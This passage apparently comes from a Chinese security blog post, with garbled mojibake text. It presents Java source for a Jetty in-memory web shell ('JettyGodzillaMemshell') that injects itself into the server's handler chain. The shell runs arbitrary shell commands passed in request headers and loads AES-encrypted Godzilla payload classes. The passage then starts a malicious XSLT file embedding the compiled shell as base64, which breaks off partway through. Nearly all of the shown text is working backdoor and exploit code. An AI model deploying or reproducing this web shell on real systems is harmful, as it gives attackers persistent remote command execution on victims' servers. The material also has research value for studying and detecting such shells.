handler.getHandlers();<br>            Handler[] newHandlers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>[handlers.length+<span class="hljs-number">1</span>];<br>            newHandlers[<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">JettyGodzillaMemshell</span>(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; handlers.length; i++) &#123;<br>                newHandlers[i + <span class="hljs-number">1</span>] = handlers[i];<br>            &#125;<br>            handler.setHandlers(newHandlers);<br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> sun.misc.Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unsafe.setAccessible(<span class="hljs-literal">true</span>);<br>        sun.misc.<span class="hljs-type">Unsafe</span> <span class="hljs-variable">theunsafe</span> <span class="hljs-operator">=</span> (sun.misc.Unsafe) unsafe.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> theunsafe;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HttpConnection <span class="hljs-title function_">getValueField</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, ClassNotFoundException, IllegalAccessException &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>        <span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> Thread.currentThread().getThreadGroup();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">threadsfiled</span> <span class="hljs-operator">=</span> threadGroup.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);<br>        Thread[] threads = (Thread[]) unsafe.getObject(threadGroup, unsafe.objectFieldOffset(threadsfiled));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;threads.length;i++) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Field</span> <span class="hljs-variable">threadLocalsF</span> <span class="hljs-operator">=</span> threads[i].getClass().getDeclaredField(<span class="hljs-string">&quot;threadLocals&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">threadlocal</span> <span class="hljs-operator">=</span> unsafe.getObject(threads[i], unsafe.objectFieldOffset(threadLocalsF));<br>                Reference[] table = (Reference[]) unsafe.getObject(threadlocal, unsafe.objectFieldOffset(threadlocal.getClass().getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>)));<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;table.length;j++)&#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//HttpConnection value = (HttpConnection) unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(&quot;value&quot;)));</span><br>                        <span class="hljs-comment">//PrintWriter writer = value.getHttpChannel().getResponse().getWriter();</span><br>                        <span class="hljs-comment">//writer.println(Runtime.getRuntime().exec(value.getHttpChannel().getRequest().getParameter(&quot;cmd&quot;)));</span><br>                        <span class="hljs-comment">//writer.flush();</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span>unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(<span class="hljs-string">&quot;value&quot;</span>)));<br>                        <span class="hljs-keyword">if</span>(value.getClass().getName().equals(<span class="hljs-string">&quot;org.eclipse.jetty.server.HttpConnection&quot;</span>))&#123;<br>                            <span class="hljs-keyword">return</span> (HttpConnection)value;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> (Exception e)&#123;<br><br>                    &#125;<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64Encode</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class base64;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64 = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);<br>            value = (String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encodeToString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64 = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.newInstance();<br>                value = (String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] base64Decode(String bs) <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class base64;<br>        <span class="hljs-type">byte</span>[] value = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64 = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);<br>            value = (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64 = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.newInstance();<br>                value = (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] x(<span class="hljs-type">byte</span>[] s, <span class="hljs-type">boolean</span> m) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            c.init(m ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(xc.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>));<br>            <span class="hljs-keyword">return</span> c.doFinal(s);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(String s, Request base, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="hljs-string">&quot;cmd&quot;</span>)) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;<br>                    String[] cmds = <span class="hljs-literal">null</span>;<br>                    <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                        cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>                    &#125;<br>                    base.setHandled(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\ASADSADASDSADAS&quot;</span>).next();<br>                    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>                    outputStream.write(result.getBytes());<br>                    outputStream.flush();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="hljs-string">&quot;godzilla&quot;</span>)) &#123;<br>                <span class="hljs-comment">// å“¥æ–¯æ‹‰æ˜¯é€šè¿‡ localhost/?pass=payload ä¼ å‚ ä¸å­˜åœ¨åŒ…è£…ç±»é—®é¢˜</span><br>                <span class="hljs-type">byte</span>[] data = base64Decode(request.getParameter(pass));<br>                data = x(data, <span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">if</span> (payload == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[<span class="hljs-number">0</span>], Thread.currentThread().getContextClassLoader());<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">defMethod</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>                    defMethod.setAccessible(<span class="hljs-literal">true</span>);<br>                    payload = (Class) defMethod.invoke(urlClassLoader, data, <span class="hljs-number">0</span>, data.length);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    java.io.<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">arrOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> payload.newInstance();<br>                    f.equals(arrOut);<br>                    f.equals(data);<br>                    f.equals(request);<br>                    base.setHandled(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>                    outputStream.write(md5.substring(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>).getBytes());<br>                    f.toString();<br>                    outputStream.write(base64Encode(x(arrOut.toByteArray(), <span class="hljs-literal">true</span>)).getBytes());<br>                    outputStream.write(md5.substring(<span class="hljs-number">16</span>).getBytes());<br>                    outputStream.flush();<br>                    <span class="hljs-keyword">return</span> ;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åç¼–è¯‘ä¸€ä¸‹è½¬æˆbase64æ”¾åˆ°xsltæ–‡ä»¶é‡Œé¢å»ï¼Œæœ€ç»ˆçš„æ¶æ„xsltå¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;yv66vgAAADMCAAgA+QoA+gD7CgA4APwKADgA/QoA+gD+BwD/CgD6AQAKAAYBAQoABgECCgA4AQMHAQQKAIgBBQgBBgkAgAEHCAEICQCAAQkHAQoKABEBBQoAEQELCgARAQwKAIABDQkAgAEOCQEPARAKAREBEggBEwoANQEUCAEVCgA1ARYKARcBGAoBFwEZBwEaCgCAARsKARwBHQoBHAEeCgA3AR8IALQKAB8BIAoAHwEhBwC1CAEiCACuBwCvCACpCgA1ASMIASQKADgBJQcBJggBJwgBKAoANQEpCgEqASsIASwHAS0HAMEHAS4HAS8IATAKADUBMQgBMggBMwgBNAgBNQgBNggBNwoBOAE5BwE6CgBCATsKATgBPAoBOAE9CAE+CwE/AUAIANMKADgBQQoAOAFCCAFDCgEPAUQKADgBRQgBRgoAOAFHCAFICAFJCAFKCgFLAUwHAU0KAU4BTwoBTgFQCgFRAVIKAFQBUwgBVAoAVAFVCgBUAVYLAVcBWAoBWQFaCgFZAVsIAVwLAT8BXQoAgAFeCgCAAV8JAIABYAcBYQcBYgoBHAFjCgBkAWQHAWUIAWYJAWcBaAoANQFpCgEqARgKAWcBagcBawoAbgEFCgA3ASUKADgBbAoANwEMCgBuAW0KAIABbgoAOAFvCgCAAXAKAC8BcQoBcgFzCgF0AXUHAXYIAXcKAXgBeQoBFwF6CgB6AXsHAXwHAX0KAIABfgoAegF/BwGABwGBCgCEAYIHAYMHAYQHAYUBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAANtZDUBAAdwYXlsb2FkAQARTGphdmEvbGFuZy9DbGFzczsBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFtAQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAFzAQADcmV0AQANU3RhY2tNYXBUYWJsZQcBLwcBBAEABjxpbml0PgEAAygpVgEABHRoaXMBAChMY29tL3h4bC9qb2IvY29yZS9KZXR0eUdvZHppbGxhTWVtc2hlbGw7AQAEKEkpVgEAAUkBAAlnZXRVbnNhZmUBABMoKUxzdW4vbWlzYy9VbnNhZmU7AQAGdW5zYWZlAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEACXRoZXVuc2FmZQEAEUxzdW4vbWlzYy9VbnNhZmU7AQAKRXhjZXB0aW9ucwEADWdldFZhbHVlRmllbGQBACsoKUxvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvSHR0cENvbm5lY3Rpb247AQAFdmFsdWUBABJMamF2YS9sYW5nL09iamVjdDsBAAFqAQANdGhyZWFkTG9jYWxzRgEAC3RocmVhZGxvY2FsAQAFdGFibGUBABpbTGphdmEvbGFuZy9yZWYvUmVmZXJlbmNlOwEAAWkBAAt0aHJlYWRHcm91cAEAF0xqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAMdGhyZWFkc2ZpbGVkAQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHARoHAYYHAYcHAS4BAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEABmJhc2U2NAEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAJicwEAAltCAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAFaBwF9BwGIAQAGaGFuZGxlAQCGKExqYXZhL2xhbmcvU3RyaW5nO0xvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvUmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEADG91dHB1dFN0cmVhbQEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQADY21kAQAOdXJsQ2xhc3NMb2FkZXIBABlMamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXI7AQAJZGVmTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEABGRhdGEBAARiYXNlAQAiTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9SZXF1ZXN0OwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsHAM8HAYkHAYoBAAg8Y2xpbml0PgEACnZhbHVlRmllbGQBAClMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0h0dHBDb25uZWN0aW9uOwEAB2hhbmRsZXIBADRMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL2hhbmRsZXIvSGFuZGxlckNvbGxlY3Rpb247AQASbXV0YWJsZVdoZW5SdW5uaW5nAQAIaGFuZGxlcnMBACNbTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyOwEAC25ld0hhbmRsZXJzAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwcBJgcBdgcA7AcBgAcBgwcBhAEAClNvdXJjZUZpbGUBABpKZXR0eUdvZHppbGxhTWVtc2hlbGwuamF2YQEAA01ENQcBiwwBjAGNDAGOAY8MAZABkQwBkgGTAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAZQBjwwAmgGVDAGWAZcMAZgBmQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAJoAmwEAEDNjNmUwYjhhOWMxNTIyNGEMAIkAigEACHVzZXJuYW1lDACLAIoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBmgGbDAGWAZkMAIwAjwwAjACKBwGcDAGdAZ4HAZ8MAaAAngEAD3N1bi5taXNjLlVuc2FmZQwBoQGiAQAJdGhlVW5zYWZlDAGjAaQHAYcMAaUBpgwBpwGoAQAPc3VuL21pc2MvVW5zYWZlDACgAKEHAakMAaoBqwwBrAGtDAGuAa8MAbABsQwBsgGzAQAMdGhyZWFkTG9jYWxzDAG0AZkBACdvcmcuZWNsaXBzZS5qZXR0eS5zZXJ2ZXIuSHR0cENvbm5lY3Rpb24MAbUBtgEAJ29yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IdHRwQ29ubmVjdGlvbgEAEGphdmEudXRpbC5CYXNlNjQBAApnZXRFbmNvZGVyDAG3AbgHAbkMAboBuwEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAG8Ab0BAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAA0FFUwcBiAwBjAG+AQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAmgG/DAHAAcEMAcIBwwEAC3gtZnVjay1kYXRhBwHEDAHFAI8MAcYBxwwByAHJAQAHb3MubmFtZQwBygCPDAHLAZkBAAN3aW4MAcwBzQEAAi9jAQAJL2Jpbi9iYXNoAQACLWMHAc4MAc8BpgEAEWphdmEvdXRpbC9TY2FubmVyBwHQDAHRAdIMAdMB1AcB1QwB1gHXDACaAdgBABBcQVNBRFNBREFTRFNBREFTDAHZAdoMAdsBmQcB3AwB3QHeBwHfDAHgAeEMAeIAmwEACGdvZHppbGxhDAHjAI8MAMIAwwwAxQDGDACNAI4BABdqYXZhL25ldC9VUkxDbGFzc0xvYWRlcgEADGphdmEvbmV0L1VSTAwB5AHlDACaAeYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwcB5wwB6ACODAHpAbgMAeoB6wEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAHsAe0MAe4BjwwAugC7DAHsAZcMAKcAqAwB7wHwBwHxDAHyAfMHAfQMAfUB9gEAMm9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9oYW5kbGVyL0hhbmRsZXJDb2xsZWN0aW9uAQATX211dGFibGVXaGVuUnVubmluZwcB9wwB6gH4DAH5AfoMAfsB/AEAIG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyAQAmY29tL3h4bC9qb2IvY29yZS9KZXR0eUdvZHppbGxhTWVtc2hlbGwMAJoAngwB/QH+AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAJoB/wEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BADBvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXIBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXABABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAE2phdmF4L2NyeXB0by9DaXBoZXIBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQALZ2V0SW5zdGFuY2UBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEACHRvU3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARb2JqZWN0RmllbGRPZmZzZXQBABwoTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOylKAQAJZ2V0T2JqZWN0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0opTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0TmFtZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAJZ2V0SGVhZGVyAQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAB2lzRW1wdHkBAAMoKVoBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBACBvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvUmVxdWVzdAEACnNldEhhbmRsZWQB